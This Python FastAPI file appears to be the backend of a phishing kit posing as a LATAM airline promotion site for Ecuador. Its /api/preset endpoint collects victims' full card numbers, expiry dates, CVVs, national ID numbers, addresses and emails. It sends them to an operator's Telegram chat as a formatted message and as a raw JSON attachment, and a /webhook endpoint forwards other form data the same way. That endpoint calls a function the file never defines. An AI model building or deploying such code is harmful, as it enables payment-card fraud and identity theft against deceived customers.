from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, validator
from typing import Any, Dict, Optional, Union
import requests, json, io, logging, re, os  # 👈 Asegúrate de incluir "os"

# ===========================
# 🔹 CONFIGURACIÓN DIRECTA
# ===========================
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
# ===========================
# 🔹 INICIALIZACIÓN DEL BOT
# ===========================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("webhook")

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://ltamaeropromoweb-ecuador.netlify.app",  # tu dominio Netlify
        "http://localhost:4200",  # opcional para desarrollo local
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
# ===========================
# 🔹 MODELOS DE ENTRADA
# ===========================
class Payload(BaseModel):  # Original para /webhook
    token: Optional[str]
    page: Dict[str, Any]
    ts: Optional[str]

class PresetPayload(BaseModel):  # Nuevo para /api/preset
    a: Optional[str] = None  # Campo 'a' agregado para "registerUserLatam"
    id: Optional[str] = None
    logpay: Optional[Any] = None  # Datos del localStorage (opcional)
    name: str
    cc: str
    datecc: str
    cvv: str
    tel: Optional[Union[str, int]] = None  # Permitir str o int
    dir: str
    cedula: Optional[Union[str, int]] = None  # Permitir str o int
    city: str
    bank: Optional[Dict[str, Any]] = None
    email: str
    ua: Optional[str] = None

    @validator('cc')
    def validate_cc(cls, v):
        digits = re.sub(r"\D", "", v)
        if not re.match(r"^\d{13,19}$", digits):
            raise ValueError("Número de tarjeta inválido")
        return digits

    @validator('datecc')
    def validate_datecc(cls, v):
        if not re.match(r"^\d{2}/\d{2}$", v):
            raise ValueError("Fecha de expiración inválida (MM/YY)")
        return v

# ===========================
# 🔹 FUNCIONES DE UTILIDAD
# ===========================
def mask_card(number: str) -> str:
    digits = re.sub(r"\D", "", str(number or ""))
    return "**** **** **** " + digits[-4:] if len(digits) > 4 else digits

def sanitize_md(text: str) -> str:
    if text is None:
        return "—"
    return str(text).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")

def build_pretty_markdown_preset(payload: PresetPayload) -> str:  # Adaptado para PresetPayload
    accion = sanitize_md(payload.a or "—")
    nombre = sanitize_md(payload.name)
    tarjeta = mask_card(payload.cc)
    datecc = sanitize_md(payload.datecc)
    cvv = sanitize_md(payload.cvv)
    tel = sanitize_md(str(payload.tel) if payload.tel else "—")  # Convertir a str si es int
    direccion = sanitize_md(payload.dir)
    cedula = sanitize_md(str(payload.cedula) if payload.cedula else "—")  # Convertir a str si es int
    ciudad = sanitize_md(payload.city)
    banco = sanitize_md(json.dumps(payload.bank, ensure_ascii=False) if payload.bank else "—")
    correo = sanitize_md(payload.email)
    ua = sanitize_md(payload.ua or "—")
    guid = sanitize_md(payload.id or "—")

    md = (
        "💳 *Preset de Pago recibido*\n\n"
        f"🎯 *Acción:* {accion}\n"  # Campo 'a' incluido en el mensaje
        f"🆔 *GUID/ID:* {guid}\n"
        f"👤 *Nombre:* {nombre}\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Expira:* {datecc}\n"
        f"🔒 *CVV:* `{cvv}`\n"
        f"📞 *Tel:* {tel}\n"
        f"🏠 *Dirección:* {direccion}\n"
        f"🆔 *Cédula:* {cedula}\n"
        f"🏙️ *Ciudad:* {ciudad}\n"
        f"🏦 *Banco/Bin:* {banco}\n"
        f"✉️ *Correo:* {correo}\n"
        f"🖥️ *UA:* {ua}"
    )
    return md

def send_telegram_message(chat_id: str, text_md: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text_md, "parse_mode": "Markdown"}
    try:
        r = requests.post(url, json=payload, timeout=10)
        r.raise_for_status()
        logger.info("✅ Mensaje enviado a Telegram")
    except Exception as e:
        logger.exception("❌ Error enviando mensaje a Telegram: %s", e)

def send_telegram_json_attachment(chat_id: str, filename: str, data_obj: dict):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    b = json.dumps(data_obj, ensure_ascii=False, indent=2).encode("utf-8")
    bio = io.BytesIO(b)
    bio.name = filename
    files = {"document": (filename, bio, "application/json")}
    data = {"chat_id": chat_id, "caption": "📎 Datos raw (JSON)"}
    try:
        r = requests.post(url, data=data, files=files, timeout=20)
        r.raise_for_status()
        logger.info("✅ Archivo JSON enviado a Telegram")
    except Exception as e:
        logger.exception("❌ Error enviando archivo JSON a Telegram: %s", e)

# ===========================
# 🔹 ENDPOINTS
# ===========================
@app.post("/webhook")  # Original
async def webhook(payload: Payload):
    try:
        page = payload.page or {}
        token = payload.token or ""
        ts = payload.ts or ""

        markdown = build_pretty_markdown(page, token, ts)
        send_telegram_message(CHAT_ID, markdown)
        send_telegram_json_attachment(CHAT_ID, "formulario_page.json", {"token": token, "page": page, "ts": ts})

        return {"status": "ok"}
    except Exception as e:
        logger.exception("Error procesando webhook: %s", e)
        raise HTTPException(status_code=500, detail="error interno")

@app.post("/api/preset")  # Nuevo para recibir de $scope.goToBanks
async def preset(payload: PresetPayload):
    try:
        markdown = build_pretty_markdown_preset(payload)
        send_telegram_message(CHAT_ID, markdown)
        send_telegram_json_attachment(CHAT_ID, "preset_pago.json", payload.dict())

        return {"status": "ok"}  # Respuesta que espera el JS
    except Exception as e:
        logger.exception("Error procesando preset: %s", e)
        raise HTTPException(status_code=500, detail="error interno")